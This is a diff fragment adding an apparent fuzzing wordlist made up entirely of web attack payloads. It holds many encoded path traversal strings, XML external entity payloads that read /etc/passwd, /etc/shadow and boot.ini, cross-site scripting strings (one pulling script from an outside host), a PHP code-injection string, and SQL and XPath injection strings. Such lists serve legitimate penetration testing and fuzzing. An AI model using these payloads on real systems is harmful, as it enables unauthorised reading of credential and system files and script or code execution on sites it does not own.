+- 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
+- 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
+- 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
+- 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
+- ..0x5c{FILE}
+- ..0x5c..0x5c{FILE}
+- ..0x5c..0x5c..0x5c{FILE}
+- ..0x5c..0x5c..0x5c..0x5c{FILE}
+- ..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
+- ..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
+- ..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
+- ..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
+- 0x2e0x2e\{FILE}
+- 0x2e0x2e\0x2e0x2e\{FILE}
+- 0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
+- 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
+- 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
+- 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
+- 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
+- 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
+- 0x2e0x2e0x5c{FILE}
+- 0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
+- 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
+- 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
+- 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
+- 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
+- 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
+- 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
+- ..%c0%2f{FILE}
+- ..%c0%2f..%c0%2f{FILE}
+- ..%c0%2f..%c0%2f..%c0%2f{FILE}
+- ..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
+- ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
+- ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
+- ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
+- ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
+- '%c0%2e%c0%2e/{FILE}'
+- '%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}'
+- '%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}'
+- '%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}'
+- '%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}'
+- '%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}'
+- '%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}'
+- '%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}'
+- '%c0%2e%c0%2e%c0%2f{FILE}'
+- '%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}'
+- '%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}'
+- '%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}'
+- '%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}'
+- '%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}'
+- '%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}'
+- '%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}'
+- ..%c0%5c{FILE}
+- ..%c0%5c..%c0%5c{FILE}
+- ..%c0%5c..%c0%5c..%c0%5c{FILE}
+- ..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
+- ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
+- ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
+- ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
+- ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
+- '%c0%2e%c0%2e\{FILE}'
+- '%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}'
+- '%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}'
+- '%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}'
+- '%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}'
+- '%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}'
+- '%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}'
+- '%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}'
+- '%c0%2e%c0%2e%c0%5c{FILE}'
+- '%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}'
+- '%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}'
+- '%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}'
+- '%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}'
+- '%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}'
+- '%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}'
+- '%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}'
+- ///%2e%2e%2f{FILE}
+- ///%2e%2e%2f%2e%2e%2f{FILE}
+- ///%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
+- ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
+- ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
+- ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
+- ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
+- ///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
+- \\\%2e%2e%5c{FILE}
+- \\\%2e%2e%5c%2e%2e%5c{FILE}
+- \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
+- \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
+- \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
+- \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
+- \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
+- \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
+- ..//{FILE}
+- ..//..//{FILE}
+- ..//..//..//{FILE}
+- ..//..//..//..//{FILE}
+- ..//..//..//..//..//{FILE}
+- ..//..//..//..//..//..//{FILE}
+- ..//..//..//..//..//..//..//{FILE}
+- ..//..//..//..//..//..//..//..//{FILE}
+- ..///{FILE}
+- ..///..///{FILE}
+- ..///..///..///{FILE}
+- ..///..///..///..///{FILE}
+- ..///..///..///..///..///{FILE}
+- ..///..///..///..///..///..///{FILE}
+- ..///..///..///..///..///..///..///{FILE}
+- ..///..///..///..///..///..///..///..///{FILE}
+- ..\\{FILE}
+- ..\\..\\{FILE}
+- ..\\..\\..\\{FILE}
+- ..\\..\\..\\..\\{FILE}
+- ..\\..\\..\\..\\..\\{FILE}
+- ..\\..\\..\\..\\..\\..\\{FILE}
+- ..\\..\\..\\..\\..\\..\\..\\{FILE}
+- ..\\..\\..\\..\\..\\..\\..\\..\\{FILE}
+- ..\\\{FILE}
+- ..\\\..\\\{FILE}
+- ..\\\..\\\..\\\{FILE}
+- ..\\\..\\\..\\\..\\\{FILE}
+- ..\\\..\\\..\\\..\\\..\\\{FILE}
+- ..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
+- ..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
+- ..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
+- ./\/./{FILE}
+- ./\/././\/./{FILE}
+- ./\/././\/././\/./{FILE}
+- ./\/././\/././\/././\/./{FILE}
+- ./\/././\/././\/././\/././\/./{FILE}
+- ./\/././\/././\/././\/././\/././\/./{FILE}
+- ./\/././\/././\/././\/././\/././\/././\/./{FILE}
+- ./\/././\/././\/././\/././\/././\/././\/././\/./{FILE}
+- .\/\.\{FILE}
+- .\/\.\.\/\.\{FILE}
+- .\/\.\.\/\.\.\/\.\{FILE}
+- .\/\.\.\/\.\.\/\.\.\/\.\{FILE}
+- .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
+- .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
+- .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
+- .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
+- ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../{FILE}
+- ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../{FILE}
+- ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../{FILE}
+- ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../{FILE}
+- ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../{FILE}
+- ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../{FILE}
+- ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../{FILE}
+- ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../{FILE}
+- .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\{FILE}
+- .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\{FILE}
+- .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\{FILE}
+- .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\{FILE}
+- .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\{FILE}
+- .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\{FILE}
+- .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\{FILE}
+- .\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\{FILE}
+- ./../{FILE}
+- ./.././../{FILE}
+- ./.././.././../{FILE}
+- ./.././.././.././../{FILE}
+- ./.././.././.././.././../{FILE}
+- ./.././.././.././.././.././../{FILE}
+- ./.././.././.././.././.././.././../{FILE}
+- ./.././.././.././.././.././.././.././../{FILE}
+- .\..\{FILE}
+- .\..\.\..\{FILE}
+- .\..\.\..\.\..\{FILE}
+- .\..\.\..\.\..\.\..\{FILE}
+- .\..\.\..\.\..\.\..\.\..\{FILE}
+- .\..\.\..\.\..\.\..\.\..\.\..\{FILE}
+- .\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
+- .\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
+- .//..//{FILE}
+- .//..//.//..//{FILE}
+- .//..//.//..//.//..//{FILE}
+- .//..//.//..//.//..//.//..//{FILE}
+- .//..//.//..//.//..//.//..//.//..//{FILE}
+- .//..//.//..//.//..//.//..//.//..//.//..//{FILE}
+- .//..//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
+- .//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
+- .\\..\\{FILE}
+- .\\..\\.\\..\\{FILE}
+- .\\..\\.\\..\\.\\..\\{FILE}
+- .\\..\\.\\..\\.\\..\\.\\..\\{FILE}
+- .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
+- .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
+- .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
+- .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
+- ../..//{FILE}
+- ../..//../{FILE}
+- ../..//../..//{FILE}
+- ../..//../..//../{FILE}
+- ../..//../..//../..//{FILE}
+- ../..//../..//../..//../{FILE}
+- ../..//../..//../..//../..//{FILE}
+- ..\..\\{FILE}
+- ..\..\\..\{FILE}
+- ..\..\\..\..\\{FILE}
+- ..\..\\..\..\\..\{FILE}
+- ..\..\\..\..\\..\..\\{FILE}
+- ..\..\\..\..\\..\..\\..\{FILE}
+- ..\..\\..\..\\..\..\\..\..\\{FILE}
+- ../..///{FILE}
+- ../..//..///{FILE}
+- ../..//../..///{FILE}
+- ../..//../..//..///{FILE}
+- ../..//../..//../..///{FILE}
+- ../..//../..//../..//..///{FILE}
+- ../..//../..//../..//../..///{FILE}
+- ..\..\\\{FILE}
+- ..\..\\..\\\{FILE}
+- ..\..\\..\..\\\{FILE}
+- ..\..\\..\..\\..\\\{FILE}
+- ..\..\\..\..\\..\..\\\{FILE}
+- ..\..\\..\..\\..\..\\..\\\{FILE}
+- ..\..\\..\..\\..\..\\..\..\\\{FILE}
+xxe:
+- <![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+- <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+- <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+- <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY
+  xee SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+- <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY
+  xee SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+- <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY
+  xee SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+- <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY
+  xee SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+- <!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM "file:///c:/boot.ini">
+- ']>'
+- <!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///etc/passwd">
+- '"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert(''XSS'');"">]]>"'
+- '"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert(''XSS'')""></B></I></xml><SPAN
+  DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN
+  DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"'
+- '"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"'
+- '"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"'
+- <name>','')); phpinfo(); exit;/*</name>
+- 'null'
+- '*'
+- '%'
+- '@'
+- $
+- '-'
+- +
+- ;
+- ':'
+- '0'
+- '-1'
+- '1'
+- '0.1'
+- '0.9'
+- 'true'
+- 'false'
+- '1.7976931348623157e+308'
+- 5e-324
+- '0.00005'
+- 5e-10
+- '&apos;XoiZR'
+- '&quot;XoiZR'
+- '&lt;Tnn96&gt;'
+- '&lt;?Tnn96 ?&gt;'
+- '&lt;? Tnn96 ?&gt;'
+- '&lt;% Tnn96 %&gt;'
+- '&lt;%= Tnn96 %&gt;'
+- '[Tnn96]'
+- (Tnn96)
+- '{Tnn96}'
+- '{{Tnn96}}'
+- '{= Tnn96}'
+- '{{= Tnn96}}'
+- ''' or ''1''=''1'
+- ''' or ''''='''
+- x' or 1=1 or 'x'='y
+- /
+- //
+- //*
+- '*/*'
+- '@*'
+- count(/child::node())
+- x' or name()='username' or 'x'='y
